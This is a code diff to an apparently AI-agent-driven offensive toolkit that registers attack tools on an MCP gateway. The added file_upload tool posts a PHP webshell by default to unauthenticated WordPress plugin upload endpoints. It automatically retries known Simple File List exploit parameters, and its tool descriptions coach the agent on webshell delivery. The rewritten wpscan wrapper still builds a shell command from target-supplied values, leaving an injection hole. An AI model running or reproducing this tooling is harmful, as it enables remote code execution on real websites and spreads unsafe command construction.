@@ -662,10 +662,10 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             from darwin.rag import get_rag
             rag = get_rag()
             # Always search WITHOUT category filter first
-            results = rag.search(query, top_k=5, category="")
+            results = rag.search(query, top_k=5, category="", min_keyword_overlap=0.2)
             # Only apply category filter if first pass is too noisy
             if len(results) > 10 and category:
-                results = rag.search(query, top_k=5, category=category)
+                results = rag.search(query, top_k=5, category=category, min_keyword_overlap=0.2)
 
             if not results:
                 try:
@@ -1092,19 +1092,336 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         timeout=60,
     )
 
+    # ── File Upload (multipart) ─────────────────────────────────────
+
+    async def _file_upload(**kwargs) -> ToolResult:
+        """Upload a file to a target URL via multipart POST (curl -F).
+
+        Creates a temporary file from the provided content, uploads it
+        to the target URL with the given field name, and returns the
+        server response.  Use for unauthenticated file upload exploits
+        (e.g. WordPress plugin upload endpoints, PHP webshell delivery).
+
+        Uses subprocess_exec (argument list, no shell) — all user-supplied
+        values are passed as individual argv entries, eliminating shell
+        injection risk.
+        """
+        import tempfile as _tmp, os as _os
+
+        url = (kwargs.get("url") or "").strip()
+        field = kwargs.get("field", "file")
+        filename = kwargs.get("filename", "payload.php")
+        content = kwargs.get("content", '<?php system($_GET["cmd"]); ?>')
+        timeout_s = max(5, int(kwargs.get("timeout", 30)))
+
+        if not url or not url.startswith("http"):
+            return ToolResult(tool_name="file_upload", success=False,
+                stdout="", stderr=f"Invalid URL: '{url}'", exit_code=1, elapsed_ms=0)
+
+        # Parse extra fields
+        extra = kwargs.get("extra_fields", {}) or {}
+        if isinstance(extra, str):
+            try:
+                import json as _json
+                extra = _json.loads(extra)
+            except Exception:
+                extra = {}
+
+        tmp_path = ""
+        try:
+            # Write content to a temporary file
+            with _tmp.NamedTemporaryFile(
+                mode="w", suffix="_" + filename, delete=False,
+            ) as _tf:
+                _tf.write(content)
+                tmp_path = _tf.name
+
+            # Build argument list (no shell — safe against injection)
+            cmd_args = [
+                "curl", "-s", "-k", "-X", "POST",
+                "-F", f"{field}=@{tmp_path};filename={filename}",
+                "--connect-timeout", "10",
+                "--max-time", str(timeout_s),
+                "-w", "\n%{http_code}",
+                url,
+            ]
+            for k, v in extra.items():
+                cmd_args.extend(["-F", f"{k}={v}"])
+
+            import time as _time
+            _start = _time.perf_counter()
+            proc = await asyncio.create_subprocess_exec(
+                *cmd_args,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            stdout, stderr = await asyncio.wait_for(
+                proc.communicate(), timeout=timeout_s + 10,
+            )
+            stdout_s = stdout.decode("utf-8", errors="replace")
+            stderr_s = stderr.decode("utf-8", errors="replace")
+            _elapsed = (_time.perf_counter() - _start) * 1000
+
+            # Parse HTTP status from curl -w output (last line)
+            _http_status = 0
+            _lines = stdout_s.strip().split("\n")
+            if _lines:
+                try:
+                    _http_status = int(_lines[-1].strip())
+                except ValueError:
+                    pass
+            _ok = (proc.returncode == 0
+                   and _http_status not in (0, 400, 401, 403, 404, 405, 500, 502, 503))
+
+            # ── Auto-retry with common extra_fields patterns ──────────
+            # Many plugin upload endpoints require additional POST params
+            # (IDs, directories, nonces).  When the first attempt fails
+            # and no extra_fields were provided, try built-in patterns
+            # automatically — no LLM round-trip needed.
+            _auto_retries = []
+            if not _ok and not extra:
+                _auto_patterns = [
+                    {"eeSFL_ID": "1",
+                     "eeSFL_FileUploadDir": "/wp-content/uploads/"},
+                    {"eeSFL_ID": "1",
+                     "eeSFL_FileUploadDir": "/wp-content/uploads/simple-file-list/"},
+                    {"action": "upload"},
+                    {"upload": "1", "dir": "/"},
+                ]
+                for _ap in _auto_patterns:
+                    _rcmd = cmd_args[:]
+                    # Remove old -w and url, then re-add after extra fields
+                    _rcmd.pop()  # url
+                    _rcmd.pop()  # -w value
+                    _rcmd.pop()  # -w
+                    for _k, _v in _ap.items():
+                        _rcmd.extend(["-F", f"{_k}={_v}"])
+                    _rcmd.extend(["-w", "\n%{http_code}", url])
+                    try:
+                        _rp = await asyncio.create_subprocess_exec(
+                            *_rcmd,
+                            stdout=asyncio.subprocess.PIPE,
+                            stderr=asyncio.subprocess.PIPE,
+                        )
+                        _rout, _rerr = await asyncio.wait_for(
+                            _rp.communicate(), timeout=timeout_s + 10,
+                        )
+                        _rs = _rout.decode("utf-8", errors="replace")
+                        _rl = _rs.strip().split("\n")
+                        _rst = 0
+                        if _rl:
+                            try:
+                                _rst = int(_rl[-1].strip())
+                            except ValueError:
+                                pass
+                        _auto_retries.append((_rst, _rs, _ap))
+                        if _rst not in (0, 400, 401, 403, 404, 405, 500, 502, 503):
+                            # Found a working pattern — stop trying more
+                            break
+                    except Exception:
+                        pass
+
+            if _auto_retries:
+                _best = min(_auto_retries, key=lambda x: x[0] if x[0] >= 200 else 999)
+                _rst, _rs, _ap = _best
+                stdout_s += (
+                    f"\n\n[AUTO-RETRY] Tried {len(_auto_retries)} extra_fields patterns. "
+                    f"Best: {_ap} → HTTP {_rst}"
+                )
+                if _rst not in (0, 400, 401, 403, 404, 405, 500, 502, 503):
+                    _http_status = _rst
+                    _ok = True
+
+            return ToolResult(
+                tool_name="file_upload", success=_ok,
+                stdout=stdout_s, stderr=stderr_s,
+                exit_code=_http_status or proc.returncode or 0,
+                elapsed_ms=_elapsed,
+            )
+
+        except asyncio.TimeoutError:
+            return ToolResult(tool_name="file_upload", success=False,
+                stdout="", stderr=f"Upload timed out after {timeout_s}s",
+                exit_code=-1, elapsed_ms=timeout_s * 1000)
+        except Exception as e:
+            return ToolResult(tool_name="file_upload", success=False,
+                stdout="", stderr=str(e), exit_code=1, elapsed_ms=0)
+        finally:
+            if tmp_path:
+                try:
+                    _os.unlink(tmp_path)
+                except OSError:
+                    pass
+
+    gateway.register(
+        name="file_upload",
+        func=_file_upload,
+        description="Upload a file via multipart POST (curl -F). Use for unauthenticated file upload exploits — WordPress plugin RCE, PHP webshell delivery, arbitrary file upload vulnerabilities. IMPORTANT: many plugin upload endpoints require additional POST parameters (IDs, directories, nonces). If you get HTTP 400/403/500, use extra_fields to add required form fields. Example: extra_fields={\"eeSFL_ID\":\"1\", \"eeSFL_FileUploadDir\":\"/wp-content/uploads/\"}",
+        parameters={
+            "url": {"type": "string", "description": "Upload endpoint URL (e.g. 'http://target/wp-content/plugins/x/ee-upload-engine.php')"},
+            "field": {"type": "string", "description": "Form field name for the file (default: 'file')"},
+            "filename": {"type": "string", "description": "Filename to upload (default: 'payload.php'). Use .php extension for PHP webshells."},
+            "content": {"type": "string", "description": "File content to upload (default: simple PHP webshell '<?php system($_GET[\"cmd\"]); ?>')"},
+            "timeout": {"type": "integer", "description": "Upload timeout in seconds (default: 30)"},
+            "extra_fields": {"type": "object", "description": "Additional form fields as JSON object. REQUIRED for many plugins. Example: {\"eeSFL_ID\": \"1\", \"eeSFL_FileUploadDir\": \"/wp-content/uploads/\"} or {\"action\": \"upload\", \"nonce\": \"...\"}. Look for required POST params in plugin docs or error responses."},
+        },
+    )
+
     # ── WordPress Exploitation ──────────────────────────────────────
 
-    gateway.register_shell_tool(
+    async def _wpscan_enum(**kwargs) -> ToolResult:
+        """Run wpscan with sensible defaults when no API token is available.
+
+        Without an API token, wpscan cannot check for vulnerable plugins/themes
+        (vp/vt flags), but it CAN still enumerate installed plugins, themes, and
+        users.  This wrapper degrades the enum_mode automatically and omits the
+        --api-token flag entirely when the token is empty.
+
+        The token is read from: (1) the LLM-provided api_token parameter,
+        (2) the WPSCAN_API_TOKEN env var, or (3) config/darwin.yaml → wpscan.api_token.
+
+        When the daily API quota is exhausted, the tool automatically retries
+        without the token so at least basic enumeration still works.
+        """
+        import os as _os
+
+        target_url = kwargs.get("target_url", "")
+        enum_mode = kwargs.get("enum_mode", "p,u")
+        api_token = (kwargs.get("api_token") or "").strip()
+
+        # Resolve token: LLM param → env var → darwin.yaml config
+        if not api_token:
+            api_token = _os.environ.get("WPSCAN_API_TOKEN", "")
+        if not api_token:
+            try:
+                import yaml as _yaml
+                _config_path = Path(__file__).parent.parent.parent / "config" / "darwin.yaml"
+                if _config_path.exists():
+                    with open(_config_path) as _f:
+                        _cfg = _yaml.safe_load(_f) or {}
+                    api_token = (_cfg.get("wpscan", {}) or {}).get("api_token", "") or ""
+            except Exception:
+                pass
+
+        has_token = bool(api_token and api_token.strip())
+
+        # ── Core runner ──────────────────────────────────────────
+        async def _run(use_token: bool) -> tuple[str, str, int, float]:
+            mode = enum_mode
+            parts = ["wpscan", "--url", target_url, "--no-banner"]
+            if use_token:
+                parts += ["--api-token", api_token]
+                # Upgrade basic enumeration to vulnerability detection when token
+                # is available.  LLM often passes p,t,u not knowing a token exists.
+                _upgraded = []
+                for _flag in mode.split(","):
+                    _flag = _flag.strip()
+                    if _flag == "p":
+                        _flag = "vp"
+                    elif _flag == "t":
+                        _flag = "vt"
+                    _upgraded.append(_flag)
+                mode = ",".join(_upgraded)
+            else:
+                # Degrade vulnerability checks to basic enumeration (no token needed)
+                mode = mode.replace("vp", "p").replace("vt", "t")
+            parts += ["--enumerate", mode]
+            cmd = " ".join(parts) + " 2>&1 | head -500"
+
+            import time as _time
+            _start = _time.perf_counter()
+            proc = await asyncio.create_subprocess_shell(
+                cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            _stdout, _stderr = await asyncio.wait_for(
+                proc.communicate(), timeout=120,
+            )
+            _elapsed = (_time.perf_counter() - _start) * 1000
+            return (
+                _stdout.decode("utf-8", errors="replace"),
+                _stderr.decode("utf-8", errors="replace"),
+                proc.returncode or 0,
+                _elapsed,
+            )
+
+        _API_LIMIT_PATTERNS = [
+            "api limit has been reached",
+            "api limit reached",
+            "api request limit",
+            "daily api limit",
+            "you have reached your api",
+            "exceeded the number of requests",
+            "too many requests",
+            "rate limit exceeded",
+        ]
+
+        # ── First run (with token if available) ─────────────────
+        try:
+            stdout_s, stderr_s, exit_code, elapsed = await _run(has_token)
+        except asyncio.TimeoutError:
+            return ToolResult(
+                tool_name="wpscan_enum", success=False,
+                stdout="", stderr="wpscan timed out after 120s",
+                exit_code=-1, elapsed_ms=120000,
+            )
+
+        # Detect API quota exhaustion and retry without token
+        if has_token:
+            combined = (stdout_s + " " + stderr_s).lower()
+            quota_hit = any(p in combined for p in _API_LIMIT_PATTERNS)
+
+            # Also detect: token provided but no vulnerability data returned
+            # (wpscan should report CVEs / vulnerability sections with a valid token)
+            has_vuln_data = (
+                "vulnerability" in combined
+                or "cve-" in combined
+                or "[critical]" in combined
+            )
+
+            if quota_hit or not has_vuln_data:
+                if quota_hit:
+                    degraded_note = (
+                        "\n\n[WPSCAN] API quota exhausted — retried without token. "
+                        "Basic enumeration results follow.\n"
+                    )
+                else:
+                    degraded_note = (
+                        "\n\n[WPSCAN] No vulnerability data returned (token may be "
+                        "invalid or quota exhausted) — retried without token.\n"
+                    )
+
+                # Re-run without token (timeout → keep original output)
+                try:
+                    stdout_s2, stderr_s2, exit_code2, elapsed2 = await _run(False)
+                    stdout_s = degraded_note + stdout_s2
+                    stderr_s = stderr_s2
+                    exit_code = exit_code2
+                    elapsed += elapsed2
+                except asyncio.TimeoutError:
+                    stdout_s = degraded_note + "\n[WPSCAN] Retry timed out — original results above.\n"
+
+        parsed = _parse_shell_output(stdout_s)
+        return ToolResult(
+            tool_name="wpscan_enum",
+            success=exit_code == 0,
+            stdout=stdout_s,
+            stderr=stderr_s,
+            exit_code=exit_code,
+            elapsed_ms=elapsed,
+            parsed_output=parsed,
+        )
+
+    gateway.register(
         name="wpscan_enum",
-        command_template="wpscan --url {target_url} --enumerate {enum_mode} --api-token {api_token} 2>&1 | head -200",
-        description="WordPress vulnerability scanner using wpscan. Enumerate plugins, themes, users, and vulnerable components. Use when whatweb_scan identifies a WordPress installation. Requires wpscan to be installed on the host.",
+        func=_wpscan_enum,
+        description="WordPress vulnerability scanner using wpscan. Enumerate plugins, themes, users, and vulnerable components. Use when whatweb_scan identifies a WordPress installation. If no API token is available, vulnerability checking (vp/vt) degrades to plugin/theme listing (p/t) automatically.",
         parameters={
             "target_url": {"type": "string", "description": "WordPress base URL (e.g. 'http://target/wordpress')"},
-            "enum_mode": {"type": "string", "description": "Enumeration mode: 'vp' (vulnerable plugins), 'vt' (vulnerable themes), 'u' (users), 'ap' (all plugins), 'at' (all themes), or combined 'p,t,u'"},
-            "api_token": {"type": "string", "description": "WPScan API token (use empty string if not available)"},
+            "enum_mode": {"type": "string", "description": "Enumeration mode: 'vp' (vulnerable plugins), 'vt' (vulnerable themes), 'u' (users), 'p' (all plugins), 't' (all themes), or combined e.g. 'p,u'"},
+            "api_token": {"type": "string", "description": "WPScan API token (leave empty if not available — plugin/theme/user listing still works)"},
         },
-        parser=_parse_shell_output,
-        timeout=120,
     )
 
     gateway.register_shell_tool(
